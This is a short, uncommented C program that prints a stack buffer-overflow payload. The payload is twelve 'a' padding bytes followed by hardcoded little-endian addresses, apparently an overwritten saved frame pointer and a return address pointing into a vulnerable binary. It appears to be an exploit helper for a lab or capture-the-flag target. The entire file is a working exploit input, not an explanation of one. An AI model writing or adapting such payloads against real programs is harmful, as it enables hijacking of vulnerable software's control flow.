#include <stdio.h>

int main() {
    char pass[29] = {'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 
                     0x70, 0xdf, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00, 
                     0xd8, 0x11, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00};
    for (int i = 0; i < 29; i++) printf("%c",pass[i]);
    return 0;
}